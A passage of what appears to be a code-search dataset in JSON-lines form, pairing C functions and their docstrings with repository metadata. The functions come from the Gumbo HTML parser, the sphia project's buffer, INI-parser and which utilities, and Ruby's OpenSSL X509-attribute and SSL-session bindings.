(node_tag_is(get_current_node(parser), GUMBO_TAG_OPTION) &&\n        node_tag_is(open_elements->data[open_elements->length - 2],\n                    GUMBO_TAG_OPTGROUP)) {\n      pop_current_node(parser);\n    }\n    if (node_tag_is(get_current_node(parser), GUMBO_TAG_OPTGROUP)) {\n      pop_current_node(parser);\n      return true;\n    } else {\n      parser_add_parse_error(parser, token);\n      ignore_token(parser);\n      return false;\n    }\n  } else if (tag_is(token, kEndTag, GUMBO_TAG_OPTION)) {\n    if (node_tag_is(get_current_node(parser), GUMBO_TAG_OPTION)) {\n      pop_current_node(parser);\n      return true;\n    } else {\n      parser_add_parse_error(parser, token);\n      ignore_token(parser);\n      return false;\n    }\n  } else if (tag_is(token, kEndTag, GUMBO_TAG_SELECT)) {\n    if (!has_an_element_in_select_scope(parser, GUMBO_TAG_SELECT)) {\n      parser_add_parse_error(parser, token);\n      ignore_token(parser);\n      return false;\n    }\n    close_current_select(parser);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_SELECT)) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    close_current_select(parser);\n    return false;\n  } else if (tag_in(token, kStartTag, GUMBO_TAG_INPUT, GUMBO_TAG_KEYGEN,\n                    GUMBO_TAG_TEXTAREA, GUMBO_TAG_LAST)) {\n    parser_add_parse_error(parser, token);\n    if (!has_an_element_in_select_scope(parser, GUMBO_TAG_SELECT)) {\n      ignore_token(parser);\n    } else {\n      close_current_select(parser);\n      parser->_parser_state->_reprocess_current_token = true;\n    }\n    return false;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_SCRIPT)) {\n    return handle_in_head(parser, token);\n  } else if (token->type == GUMBO_TOKEN_EOF) {\n    if (get_current_node(parser) != parser->_output->root) {\n      parser_add_parse_error(parser, token);\n      return false;\n    }\n    return true;\n  } else {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  }\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Like tag_in, but for the single-tag case.\n", "func_signal": "static bool tag_is(const GumboToken* token, bool is_start, GumboTag tag)", "code": "{\n  if (is_start && token->type == GUMBO_TOKEN_START_TAG) {\n    return token->v.start_tag.tag == tag;\n  } else if (!is_start && token->type == GUMBO_TOKEN_END_TAG) {\n    return token->v.end_tag == tag;\n  } else {\n    return false;\n  }\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// If the stack of open elements has a <p> tag in button scope, this acts as if\n// a </p> tag was encountered, implicitly closing tags.  Returns false if a\n// parse error occurs.  This is a convenience function because this particular\n// clause appears several times in the spec.\n", "func_signal": "static bool maybe_implicitly_close_p_tag(GumboParser* parser, GumboToken* token)", "code": "{\n  if (has_an_element_in_button_scope(parser, GUMBO_TAG_P)) {\n    return implicitly_close_tags(parser, token, GUMBO_TAG_P);\n  }\n  return true;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// This factors out the clauses relating to \"act as if an end tag token with tag\n// name \"table\" had been seen.  Returns true if there's a table element in table\n// scope which was successfully closed, false if not and the token should be\n// ignored.  Does not add parse errors; callers should handle that.\n", "func_signal": "static bool close_table(GumboParser* parser)", "code": "{\n  if (!has_an_element_in_table_scope(parser, GUMBO_TAG_TABLE)) {\n    return false;\n  }\n\n  GumboNode* node = pop_current_node(parser);\n  while (!node_tag_is(node, GUMBO_TAG_TABLE)) {\n    node = pop_current_node(parser);\n  }\n  reset_insertion_mode_appropriately(parser);\n  return true;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Returns the node at the bottom of the stack of open elements, or NULL if no\n// elements have been added yet.\n", "func_signal": "static GumboNode* get_current_node(GumboParser* parser)", "code": "{\n  GumboVector* open_elements = &parser->_parser_state->_open_elements;\n  if (open_elements->length == 0) {\n    assert(!parser->_output->root);\n    return NULL;\n  }\n  assert(open_elements->length > 0);\n  assert(open_elements->data != NULL);\n  return open_elements->data[open_elements->length - 1];\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-afterbody\n", "func_signal": "static bool handle_after_body(GumboParser* parser, GumboToken* token)", "code": "{\n  if (token->type == GUMBO_TOKEN_WHITESPACE ||\n      tag_is(token, kStartTag, GUMBO_TAG_HTML)) {\n    return handle_in_body(parser, token);\n  } else if (token->type == GUMBO_TOKEN_COMMENT) {\n    GumboNode* html_node = parser->_output->root;\n    assert(html_node != NULL);\n    append_comment_node(parser, html_node, token);\n    return true;\n  } else if (token->type == GUMBO_TOKEN_DOCTYPE) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else if (tag_is(token, kEndTag, GUMBO_TAG_HTML)) {\n    // TODO(jdtang): Handle fragment parsing algorithm case.\n    set_insertion_mode(parser, GUMBO_INSERTION_MODE_AFTER_AFTER_BODY);\n    GumboNode* html = parser->_parser_state->_open_elements.data[0];\n    assert(node_tag_is(html, GUMBO_TAG_HTML));\n    record_end_of_element(\n        parser->_parser_state->_current_token, &html->v.element);\n    return true;\n  } else if (token->type == GUMBO_TOKEN_EOF) {\n    return true;\n  } else {\n    parser_add_parse_error(parser, token);\n    set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_BODY);\n    parser->_parser_state->_reprocess_current_token = true;\n    return false;\n  }\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Like \"has an element in scope\", but for the specific case of looking for a\n// unique target node, not for any node with a given tag name.  This duplicates\n// much of the algorithm from has_an_element_in_specific_scope because the\n// predicate is different when checking for an exact node, and it's easier &\n// faster just to duplicate the code for this one case than to try and\n// parameterize it.\n", "func_signal": "static bool has_node_in_scope(GumboParser* parser, const GumboNode* node)", "code": "{\n  GumboVector* open_elements = &parser->_parser_state->_open_elements;\n  for (int i = open_elements->length; --i >= 0; ) {\n    const GumboNode* current = open_elements->data[i];\n    if (current == node) {\n      return true;\n    }\n    if (current->type != GUMBO_NODE_ELEMENT) {\n      continue;\n    }\n    if (node_tag_in(\n        current, GUMBO_TAG_APPLET, GUMBO_TAG_CAPTION, GUMBO_TAG_HTML,\n        GUMBO_TAG_TABLE, GUMBO_TAG_TD, GUMBO_TAG_TH, GUMBO_TAG_MARQUEE,\n        GUMBO_TAG_OBJECT, GUMBO_TAG_MI, GUMBO_TAG_MO, GUMBO_TAG_MN,\n        GUMBO_TAG_MS, GUMBO_TAG_MTEXT, GUMBO_TAG_ANNOTATION_XML,\n        GUMBO_TAG_FOREIGNOBJECT, GUMBO_TAG_DESC, GUMBO_TAG_TITLE,\n        GUMBO_TAG_LAST)) {\n      return false;\n    }\n  }\n  assert(false);\n  return false;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Creates a parser-inserted element in the HTML namespace and returns it.\n", "func_signal": "static GumboNode* create_element(GumboParser* parser, GumboTag tag)", "code": "{\n  GumboNode* node = create_node(parser, GUMBO_NODE_ELEMENT);\n  GumboElement* element = &node->v.element;\n  gumbo_vector_init(parser, 1, &element->children);\n  gumbo_vector_init(parser, 0, &element->attributes);\n  element->tag = tag;\n  element->tag_namespace = GUMBO_NAMESPACE_HTML;\n  element->original_tag = kGumboEmptyString;\n  element->original_end_tag = kGumboEmptyString;\n  element->start_pos = parser->_parser_state->_current_token->position;\n  element->end_pos = kGumboEmptySourcePosition;\n  return node;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Constructs an element from the given start tag token.\n", "func_signal": "static GumboNode* create_element_from_token(\n    GumboParser* parser, GumboToken* token, GumboNamespaceEnum tag_namespace)", "code": "{\n  assert(token->type == GUMBO_TOKEN_START_TAG);\n  GumboTokenStartTag* start_tag = &token->v.start_tag;\n\n  GumboNode* node = create_node(parser, GUMBO_NODE_ELEMENT);\n  GumboElement* element = &node->v.element;\n  gumbo_vector_init(parser, 1, &element->children);\n  element->attributes = start_tag->attributes;\n  element->tag = start_tag->tag;\n  element->tag_namespace = tag_namespace;\n\n  assert(token->original_text.length >= 2);\n  assert(token->original_text.data[0] == '<');\n  assert(token->original_text.data[token->original_text.length - 1] == '>');\n  element->original_tag = token->original_text;\n  element->start_pos = token->position;\n  element->original_end_tag = kGumboEmptyString;\n  element->end_pos = kGumboEmptySourcePosition;\n\n  // The element takes ownership of the attributes from the token, so any\n  // allocated-memory fields should be nulled out.\n  start_tag->attributes = kGumboEmptyVector;\n  return node;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#clear-the-stack-back-to-a-table-body-context\n", "func_signal": "void clear_stack_to_table_body_context(GumboParser* parser)", "code": "{\n  while (!node_tag_in(get_current_node(parser), GUMBO_TAG_HTML,\n                      GUMBO_TAG_TBODY, GUMBO_TAG_TFOOT, GUMBO_TAG_THEAD,\n                      GUMBO_TAG_LAST)) {\n    pop_current_node(parser);\n  }\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/multipage/tree-construction.html#mathml-text-integration-point\n", "func_signal": "static bool is_mathml_integration_point(const GumboNode* node)", "code": "{\n  return node_tag_in(node, GUMBO_TAG_MI, GUMBO_TAG_MO, GUMBO_TAG_MN,\n                     GUMBO_TAG_MS, GUMBO_TAG_MTEXT, GUMBO_TAG_LAST) &&\n      node->v.element.tag_namespace == GUMBO_NAMESPACE_MATHML;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "/*\n * Return a new buffer based on the `from..to` slice of `buf`,\n * or NULL on error.\n */\n", "func_signal": "buffer_t *\nbuffer_slice(buffer_t *buf, size_t from, ssize_t to)", "code": "{\n  size_t len = strlen(buf->data);\n\n  // bad range\n  if (to < from) return NULL;\n\n  // relative to end\n  if (to < 0) to = len - ~to;\n\n  // cap end\n  if (to > len) to = len;\n\n  size_t n = to - from;\n  buffer_t *self = buffer_new_with_size(n);\n  memcpy(self->data, buf->data + from, n);\n  return self;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Allocate a new buffer with a copy of `str`.\n */\n", "func_signal": "buffer_t *\nbuffer_new_with_copy(char *str)", "code": "{\n  size_t len = strlen(str);\n  buffer_t *self = buffer_new_with_size(len);\n  if (!self) return NULL;\n  memcpy(self->alloc, str, len);\n  self->data = self->alloc;\n  return self;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Trim trailing whitespace.\n */\n", "func_signal": "void\nbuffer_trim_right(buffer_t *self)", "code": "{\n  int c;\n  size_t i = buffer_length(self) - 1;\n  while ((c = self->data[i]) && isspace(c)) {\n    self->data[i--] = 0;\n  }\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "// See #5\n", "func_signal": "static void\ntest_similar_keys()", "code": "{\n  char k1[] = \"key-1\";\n  char v1[] = \"val-1\";\n  assert(-1 != sphia_set(sphia, k1, v1));\n\n  char k2[] = \"key-10\";\n  char v2[] = \"val-10\";\n  assert(-1 != sphia_set(sphia, k2, v2));\n\n  char *res = sphia_get(sphia, k1);\n  assert(0 == strcmp(v1, res));\n}", "path": "test\\set-similar-keys.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Resize to hold `n` bytes.\n */\n", "func_signal": "int\nbuffer_resize(buffer_t *self, size_t n)", "code": "{\n  n = nearest_multiple_of(1024, n);\n  self->len = n;\n  self->alloc = self->data = realloc(self->alloc, n + 1);\n  if (!self->alloc) return -1;\n  self->alloc[n] = '\\0';\n  return 0;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/* Strip whitespace chars off end of given string, in place. Return s. */\n", "func_signal": "static char* rstrip(char* s)", "code": "{\n    char* p = s + strlen(s);\n    while (p > s && isspace((unsigned char)(*--p)))\n        *p = '\\0';\n    return s;\n}", "path": "deps\\inih\\ini.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Prepend `str` to `self` and return 0 on success, -1 on failure.\n */\n", "func_signal": "int\nbuffer_prepend(buffer_t *self, char *str)", "code": "{\n  size_t len = strlen(str);\n  size_t prev = strlen(self->data);\n  size_t needed = len + prev;\n\n  // enough space\n  if (self->len > needed) goto move;\n\n  // resize\n  int ret = buffer_resize(self, needed);\n  if (-1 == ret) return -1;\n\n  // move\n  move:\n  memmove(self->data + len, self->data, len + 1);\n  memcpy(self->data, str, len);\n\n  return 0;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Lookup executable `name` within `path`.\n */\n", "func_signal": "char *\nwhich_path(const char *name, const char *_path)", "code": "{\n  char *path = strdup(_path);\n  char *tok = strtok(path, WHICH_DELIMITER);\n\n  while (tok) {\n    // path\n    int len = strlen(tok) + 2 + strlen(name);\n    char *file = malloc(len);\n    if (!file) return NULL;\n    sprintf(file, \"%s/%s\", tok, name);\n\n    // executable\n    if (0 == access(file, X_OK)) {\n      return file;\n    }\n\n    // next token\n    tok = strtok(NULL, WHICH_DELIMITER);\n    free(file);\n  }\n\n  free(path);\n\n  return NULL;\n}", "path": "deps\\which\\which.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Allocate a new buffer with `n` bytes.\n */\n", "func_signal": "buffer_t *\nbuffer_new_with_size(size_t n)", "code": "{\n  buffer_t *self = malloc(sizeof(buffer_t));\n  if (!self) return NULL;\n  self->len = n;\n  self->data = self->alloc = calloc(n + 1, 1);\n  return self;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/* Version of strncpy that ensures dest (size bytes) is null-terminated. */\n", "func_signal": "static char* strncpy0(char* dest, const char* src, size_t size)", "code": "{\n    strncpy(dest, src, size);\n    dest[size - 1] = '\\0';\n    return dest;\n}", "path": "deps\\inih\\ini.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Return the index of the substring `str`, or -1 on failure.\n */\n", "func_signal": "ssize_t\nbuffer_indexof(buffer_t *self, char *str)", "code": "{\n  char *sub = strstr(self->data, str);\n  if (!sub) return -1;\n  return sub - self->data;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/* See documentation in header file. */\n", "func_signal": "int ini_parse_file(FILE* file,\n                   int (*handler)(void*, const char*, const char*,\n                                  const char*),\n                   void* user)", "code": "{\n    /* Uses a fair bit of stack (use heap instead if you need to) */\n#if INI_USE_STACK\n    char line[INI_MAX_LINE];\n#else\n    char* line;\n#endif\n    char section[MAX_SECTION] = \"\";\n    char prev_name[MAX_NAME] = \"\";\n\n    char* start;\n    char* end;\n    char* name;\n    char* value;\n    int lineno = 0;\n    int error = 0;\n\n#if !INI_USE_STACK\n    line = (char*)malloc(INI_MAX_LINE);\n    if (!line) {\n        return -2;\n    }\n#endif\n\n    /* Scan through file line by line */\n    while (fgets(line, INI_MAX_LINE, file) != NULL) {\n        lineno++;\n\n        start = line;\n#if INI_ALLOW_BOM\n        if (lineno == 1 && (unsigned char)start[0] == 0xEF &&\n                           (unsigned char)start[1] == 0xBB &&\n                           (unsigned char)start[2] == 0xBF) {\n            start += 3;\n        }\n#endif\n        start = lskip(rstrip(start));\n\n        if (*start == ';' || *start == '#') {\n            /* Per Python ConfigParser, allow '#' comments at start of line */\n        }\n#if INI_ALLOW_MULTILINE\n        else if (*prev_name && *start && start > line) {\n            /* Non-black line with leading whitespace, treat as continuation\n               of previous name's value (as per Python ConfigParser). */\n            if (!handler(user, section, prev_name, start) && !error)\n                error = lineno;\n        }\n#endif\n        else if (*start == '[') {\n            /* A \"[section]\" line */\n            end = find_char_or_comment(start + 1, ']');\n            if (*end == ']') {\n                *end = '\\0';\n                strncpy0(section, start + 1, sizeof(section));\n                *prev_name = '\\0';\n            }\n            else if (!error) {\n                /* No ']' found on section line */\n                error = lineno;\n            }\n        }\n        else if (*start && *start != ';') {\n            /* Not a comment, must be a name[=:]value pair */\n            end = find_char_or_comment(start, '=');\n            if (*end != '=') {\n                end = find_char_or_comment(start, ':');\n            }\n            if (*end == '=' || *end == ':') {\n                *end = '\\0';\n                name = rstrip(start);\n                value = lskip(end + 1);\n                end = find_char_or_comment(value, '\\0');\n                if (*end == ';')\n                    *end = '\\0';\n                rstrip(value);\n\n                /* Valid name[=:]value pair found, call handler */\n                strncpy0(prev_name, name, sizeof(prev_name));\n                if (!handler(user, section, name, value) && !error)\n                    error = lineno;\n            }\n            else if (!error) {\n                /* No '=' or ':' found on name[=:]value line */\n                error = lineno;\n            }\n        }\n\n#if INI_STOP_ON_FIRST_ERROR\n        if (error)\n            break;\n#endif\n    }\n\n#if !INI_USE_STACK\n    free(line);\n#endif\n\n    return error;\n}", "path": "deps\\inih\\ini.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Allocate a new buffer with `str` and `len`.\n */\n", "func_signal": "buffer_t *\nbuffer_new_with_string_length(char *str, size_t len)", "code": "{\n  buffer_t *self = malloc(sizeof(buffer_t));\n  if (!self) return NULL;\n  self->len = len;\n  self->data = self->alloc = str;\n  return self;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/* See documentation in header file. */\n", "func_signal": "int ini_parse(const char* filename,\n              int (*handler)(void*, const char*, const char*, const char*),\n              void* user)", "code": "{\n    FILE* file;\n    int error;\n\n    file = fopen(filename, \"r\");\n    if (!file)\n        return -1;\n    error = ini_parse_file(file, handler, user);\n    fclose(file);\n    return error;\n}", "path": "deps\\inih\\ini.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Trim leading whitespace.\n */\n", "func_signal": "void\nbuffer_trim_left(buffer_t *self)", "code": "{\n  int c;\n  while ((c = *self->data) && isspace(c)) {\n    ++self->data;\n  }\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Append `str` to `self` and return 0 on success, -1 on failure.\n */\n", "func_signal": "int\nbuffer_append(buffer_t *self, char *str)", "code": "{\n  size_t len = strlen(str);\n  size_t prev = strlen(self->data);\n  size_t needed = len + prev;\n\n  // enough space\n  if (self->len > needed) {\n    strcat(self->data, str);\n    return 0;\n  }\n\n  // resize\n  int ret = buffer_resize(self, needed);\n  if (-1 == ret) return -1;\n  strcat(self->data, str);\n\n  return 0;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/* Return pointer to first char c or ';' comment in given string, or pointer to\n   null at end of string if neither found. ';' must be prefixed by a whitespace\n   character to register as a comment. */\n", "func_signal": "static char* find_char_or_comment(const char* s, char c)", "code": "{\n    int was_whitespace = 0;\n    while (*s && *s != c && !(was_whitespace && *s == ';')) {\n        was_whitespace = isspace((unsigned char)(*s));\n        s++;\n    }\n    return (char*)s;\n}", "path": "deps\\inih\\ini.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "// signal handlers\n", "func_signal": "static void\nhandle_sigterm (int param)", "code": "{\n  int rc = 1;\n  switch (param) {\n    case SIGINT:\n    case SIGTERM:\n      rc = 0;\n      break;\n  }\n\n  printf(\"\\n\");\n  exit(rc);\n}", "path": "deps\\repl\\init.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * Deallocate excess memory, the number\n * of bytes removed or -1.\n */\n", "func_signal": "ssize_t\nbuffer_compact(buffer_t *self)", "code": "{\n  size_t len = buffer_length(self);\n  size_t rem = self->len - len;\n  char *buf = calloc(len + 1, 1);\n  if (!buf) return -1;\n  memcpy(buf, self->data, len);\n  free(self->alloc);\n  self->len = len;\n  self->data = self->alloc = buf;\n  return rem;\n}", "path": "deps\\repl\\buffer.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/* Return pointer to first non-whitespace char in given string. */\n", "func_signal": "static char* lskip(const char* s)", "code": "{\n    while (*s && isspace((unsigned char)(*s)))\n        s++;\n    return (char*)s;\n}", "path": "deps\\inih\\ini.c", "repo_name": "sphia/sphia", "stars": 149, "license": "mit", "language": "c", "size": 1308}
{"docstring": "/*\n * call-seq:\n *    attr.value => asn1\n */\n", "func_signal": "static VALUE\nossl_x509attr_get_value(VALUE self)", "code": "{\n    X509_ATTRIBUTE *attr;\n    VALUE str, asn1;\n    long length;\n    unsigned char *p;\n\n    GetX509Attr(self, attr);\n    if(attr->value.ptr == NULL) return Qnil;\n    if(OSSL_X509ATTR_IS_SINGLE(attr)){\n\tlength = i2d_ASN1_TYPE(attr->value.single, NULL);\n\tstr = rb_str_new(0, length);\n\tp = (unsigned char *)RSTRING_PTR(str);\n\ti2d_ASN1_TYPE(attr->value.single, &p);\n\tossl_str_adjust(str, p);\n    }\n    else{\n\tlength = i2d_ASN1_SET_OF_ASN1_TYPE(attr->value.set, NULL,\n\t\t\ti2d_ASN1_TYPE, V_ASN1_SET, V_ASN1_UNIVERSAL, 0);\n\tstr = rb_str_new(0, length);\n\tp = (unsigned char *)RSTRING_PTR(str);\n\ti2d_ASN1_SET_OF_ASN1_TYPE(attr->value.set, &p,\n\t\t\ti2d_ASN1_TYPE, V_ASN1_SET, V_ASN1_UNIVERSAL, 0);\n\tossl_str_adjust(str, p);\n    }\n    asn1 = rb_funcall(mASN1, rb_intern(\"decode\"), 1, str);\n\n    return asn1;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    session1 == session2 -> boolean\n *\n*/\n", "func_signal": "static VALUE ossl_ssl_session_eq(VALUE val1, VALUE val2)", "code": "{\n\tSSL_SESSION *ctx1, *ctx2;\n\n\tGetSSLSession(val1, ctx1);\n\tSafeGetSSLSession(val2, ctx2);\n\n\tswitch (SSL_SESSION_cmp(ctx1, ctx2)) {\n\tcase 0:\t\treturn Qtrue;\n\tdefault:\treturn Qfalse;\n\t}\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    attr.to_der => string\n */\n", "func_signal": "static VALUE\nossl_x509attr_to_der(VALUE self)", "code": "{\n    X509_ATTRIBUTE *attr;\n    VALUE str;\n    int len;\n    unsigned char *p;\n\n    GetX509Attr(self, attr);\n    if((len = i2d_X509_ATTRIBUTE(attr, NULL)) <= 0)\n\tossl_raise(eX509AttrError, NULL);\n    str = rb_str_new(0, len);\n    p = (unsigned char *)RSTRING_PTR(str);\n    if(i2d_X509_ATTRIBUTE(attr, &p) <= 0)\n\tossl_raise(eX509AttrError, NULL);\n    rb_str_set_len(str, p - (unsigned char*)RSTRING_PTR(str)); \n\n    return str;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    Attribute.new(oid [, value]) => attr\n */\n", "func_signal": "static VALUE\nossl_x509attr_initialize(int argc, VALUE *argv, VALUE self)", "code": "{\n    VALUE oid, value;\n    X509_ATTRIBUTE *attr, *x;\n    const unsigned char *p;\n\n    GetX509Attr(self, attr);\n    if(rb_scan_args(argc, argv, \"11\", &oid, &value) == 1){\n\toid = ossl_to_der_if_possible(oid);\n\tStringValue(oid);\n\tp = (unsigned char *)RSTRING_PTR(oid);\n\tx = d2i_X509_ATTRIBUTE(&attr, &p, RSTRING_LEN(oid));\n\tDATA_PTR(self) = attr;\n\tif(!x){\n\t    ossl_raise(eX509AttrError, NULL);\n\t}\n\treturn self;\n    }\n    rb_funcall(self, rb_intern(\"oid=\"), 1, oid);\n    rb_funcall(self, rb_intern(\"value=\"), 1, value);\n\n    return self;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    attr.oid => string\n */\n", "func_signal": "static VALUE\nossl_x509attr_get_oid(VALUE self)", "code": "{\n    X509_ATTRIBUTE *attr;\n    ASN1_OBJECT *oid;\n    BIO *out;\n    VALUE ret;\n    int nid;\n\n    GetX509Attr(self, attr);\n    oid = X509_ATTRIBUTE_get0_object(attr);\n    if ((nid = OBJ_obj2nid(oid)) != NID_undef)\n\tret = rb_str_new2(OBJ_nid2sn(nid));\n    else{\n\tif (!(out = BIO_new(BIO_s_mem())))\n\t    ossl_raise(eX509AttrError, NULL);\n\ti2a_ASN1_OBJECT(out, oid);\n\tret = ossl_membio2str(out);\n    }\n  \n    return ret;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    attr.oid = string => string\n */\n", "func_signal": "static VALUE\nossl_x509attr_set_oid(VALUE self, VALUE oid)", "code": "{\n    X509_ATTRIBUTE *attr;\n    ASN1_OBJECT *obj;\n    char *s;\n \n    s = StringValuePtr(oid);\n    obj = OBJ_txt2obj(s, 0);\n    if(!obj) obj = OBJ_txt2obj(s, 1);\n    if(!obj) ossl_raise(eX509AttrError, NULL);\n    GetX509Attr(self, attr);\n    X509_ATTRIBUTE_set1_object(attr, obj);\n \n    return oid;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * X509_ATTRIBUTE init\n */\n", "func_signal": "void\nInit_ossl_x509attr()", "code": "{\n    eX509AttrError = rb_define_class_under(mX509, \"AttributeError\", eOSSLError);\n\n    cX509Attr = rb_define_class_under(mX509, \"Attribute\", rb_cObject);\n    rb_define_alloc_func(cX509Attr, ossl_x509attr_alloc);\n    rb_define_method(cX509Attr, \"initialize\", ossl_x509attr_initialize, -1);\n    rb_define_method(cX509Attr, \"oid=\", ossl_x509attr_set_oid, 1);\n    rb_define_method(cX509Attr, \"oid\", ossl_x509attr_get_oid, 0);\n    rb_define_method(cX509Attr, \"value=\", ossl_x509attr_set_value, 1);\n    rb_define_method(cX509Attr, \"value\", ossl_x509attr_get_value, 0);\n    rb_define_method(cX509Attr, \"to_der\", ossl_x509attr_to_der, 0);\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    session.timeout -> integer\n *\n * How long until the session expires in seconds.\n *\n*/\n", "func_signal": "static VALUE ossl_ssl_session_get_timeout(VALUE self)", "code": "{\n\tSSL_SESSION *ctx;\n\ttime_t t;\n\n\tGetSSLSession(self, ctx);\n\n\tt = SSL_SESSION_get_timeout(ctx);\n\n\treturn TIMET2NUM(t);\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
